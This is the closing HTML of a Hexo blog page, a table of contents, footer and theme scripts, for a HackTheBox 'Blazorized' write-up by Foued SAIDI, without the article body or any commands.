+        
+
+        
+            <div class="article-nav my-8 flex justify-between items-center px-2 sm:px-6 md:px-8">
+                
+                
+                    <div class="article-next border-border-color shadow-redefine-flat shadow-shadow-color-2 rounded-medium px-4 py-2 hover:shadow-redefine-flat-hover hover:shadow-shadow-color-2">
+                        <a class="next"
+                        rel="next"
+                        href="/2024/11/01/Hackthebox-PermX/"
+                        >
+                            <span class="title flex justify-center items-center">
+                                <span class="post-nav-title-item">Hackthebox: PermX</span>
+                                <span class="post-nav-item">Next posts</span>
+                            </span>
+                            <span class="right arrow-icon flex justify-center items-center">
+                                <i class="fa-solid fa-chevron-right"></i>
+                            </span>
+                        </a>
+                    </div>
+                
+            </div>
+        
+
+
+        
+    </div>
+
+    
+        <div class="toc-content-container">
+            <div class="post-toc-wrap">
+    <div class="post-toc">
+        <div class="toc-title">On this page</div>
+        <div class="page-title">Hackthebox: Blazorized</div>
+        <ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#Overview"><span class="nav-text">Overview</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Reconnaissance"><span class="nav-text">Reconnaissance</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-blazoried-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;blazoried.htb&#x2F; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Web-Application-http-admin-blazoried-htb"><span class="nav-text">Web Application - http:&#x2F;&#x2F;admin.blazoried.htb&#x2F; </span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Privilege-Escalation"><span class="nav-text">Privilege Escalation</span></a></li></ol>
+
+    </div>
+</div>
+        </div>
+    
+</div>
+
+
+
+                
+
+            </div>
+
+            
+
+        </div>
+
+        <div class="main-content-footer">
+            <footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color">
+    <div class="info-container py-3 text-center">
+        
+        <div class="text-center">
+            &copy;
+            
+              <span>2023</span>
+              -
+            
+            2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration: 0.5s; color: #f54545"></i>&nbsp;&nbsp;<a href="/">Foued SAIDI</a>
+        </div>
+        
+            <script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+            <div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right">
+                
+                    <span id="busuanzi_container_site_uv" class="lg:!block">
+                        <span class="text-sm">VISITOR COUNT</span>
+                        <span id="busuanzi_value_site_uv"></span>
+                    </span>
+                
+                
+                    <span id="busuanzi_container_site_pv" class="lg:!block">
+                        <span class="text-sm">TOTAL PAGE VIEWS</span>
+                        <span id="busuanzi_value_site_pv"></span>
+                    </span>
+                
+            </div>
+        
+        <div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left">
+            <span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z M349,354.6l-18.4,10.7l-18.6-11V275H200v79.6l-18.4,10.7l-18.6-11v-197l18.5-10.6l18.5,10.8V237h112v-79.6l18.5-10.6l18.5,10.8V354.6z"/></svg><a target="_blank" class="text-base" href="https://hexo.io">Hexo</a></span>
+            <span class="text-sm lg:block">THEME&nbsp;<a class="text-base" target="_blank" href="https://github.com/EvanNotFound/hexo-theme-redefine">Redefine v2.5.2</a></span>
+        </div>
+        
+        
+            <div>
+                Blog up for <span class="odometer" id="runtime_days" ></span> days <span class="odometer" id="runtime_hours"></span> hrs <span class="odometer" id="runtime_minutes"></span> Min <span class="odometer" id="runtime_seconds"></span> Sec
+            </div>
+        
+        
+            <script data-swup-reload-script>
+                try {
+                    function odometer_init() {
+                    const elements = document.querySelectorAll('.odometer');
+                    elements.forEach(el => {
+                        new Odometer({
+                            el,
+                            format: '( ddd).dd',
+                            duration: 200
+                        });
+                    });
+                    }
+                    odometer_init();
+                } catch (error) {}
+            </script>
+        
+        
+        
+    </div>  
+</footer>
+        </div>
+    </div>
+
+    
+        <div class="post-tools">
+            <div class="post-tools-container">
+    <ul class="article-tools-list">
+        <!-- TOC aside toggle -->
+        
+            <li class="right-bottom-tools page-aside-toggle">
+                <i class="fa-regular fa-outdent"></i>
+            </li>
+        
+
+        <!-- go comment -->
+        
+    </ul>
+</div>
+
+        </div>
+    
+
+    <div class="right-side-tools-container">
+        <div class="side-tools-container">
+    <ul class="hidden-tools-list">
+        <li class="right-bottom-tools tool-font-adjust-plus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-plus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-font-adjust-minus flex justify-center items-center">
+            <i class="fa-regular fa-magnifying-glass-minus"></i>
+        </li>
+
+        <li class="right-bottom-tools tool-dark-light-toggle flex justify-center items-center">
+            <i class="fa-regular fa-moon"></i>
+        </li>
+
+        <!-- rss -->
+        
+
+        
+
+        <li class="right-bottom-tools tool-scroll-to-bottom flex justify-center items-center">
+            <i class="fa-regular fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="visible-tools-list">
+        <li class="right-bottom-tools toggle-tools-list flex justify-center items-center">
+            <i class="fa-regular fa-cog fa-spin"></i>
+        </li>
+        
+            <li class="right-bottom-tools tool-scroll-to-top flex justify-center items-center">
+                <i class="arrow-up fas fa-arrow-up"></i>
+                <span class="percent"></span>
+            </li>
+        
+        
+    </ul>
+</div>
+
+    </div>
+
+    <div class="image-viewer-container">
+    <img src="">
+</div>
+
+
+    
+
+</main>
+
+
+    
+<script src="/js/libs/Swup.min.js"></script>
+
+<script src="/js/libs/SwupSlideTheme.min.js"></script>
+
+<script src="/js/libs/SwupScriptsPlugin.min.js"></script>
+
+<script src="/js/libs/SwupProgressPlugin.min.js"></script>
+
+<script src="/js/libs/SwupScrollPlugin.min.js"></script>
+
+<script src="/js/libs/SwupPreloadPlugin.min.js"></script>
+
+<script>
+    const swup = new Swup({
+        plugins: [
+            new SwupScriptsPlugin({
+                optin: true,
+            }),
+            new SwupProgressPlugin(),
+            new SwupScrollPlugin({
+                offset: 80,
+            }),
+            new SwupSlideTheme({
+                mainElement: ".main-content-body",
+            }),
+            new SwupPreloadPlugin(),
+        ],
+        containers: ["#swup"],
+    });
+</script>
+
+
+
+
+
+
+
+<script src="/js/tools/imageViewer.js" type="module"></script>
+
+<script src="/js/utils.js" type="module"></script>
+
+<script src="/js/main.js" type="module"></script>
+
+<script src="/js/layouts/navbarShrink.js" type="module"></script>
+
+<script src="/js/tools/scrollTopBottom.js" type="module"></script>
+
+<script src="/js/tools/lightDarkSwitch.js" type="module"></script>
+
+<script src="/js/layouts/categoryList.js" type="module"></script>
+
+
+
+
+
+    
+<script src="/js/tools/codeBlock.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/layouts/lazyload.js" type="module"></script>
+
+
+
+
+    
+<script src="/js/tools/runtime.js"></script>
+
+    
+<script src="/js/libs/odometer.min.js"></script>
+
+    
+<link rel="stylesheet" href="/assets/odometer-theme-minimal.css">
+
+
+
+
+  
+<script src="/js/libs/Typed.min.js"></script>
+
+  
+<script src="/js/plugins/typed.js" type="module"></script>
+
+
+
+
+
+
+
+<div class="post-scripts" data-swup-reload-script>
+    
+        
+<script src="/js/libs/anime.min.js"></script>
+
+        
+<script src="/js/tools/tocToggle.js" type="module"></script>
+
+<script src="/js/layouts/toc.js" type="module"></script>
+
+<script src="/js/plugins/tabs.js" type="module"></script>
+
+    
+</div>
+
+
+</body>
+</html>
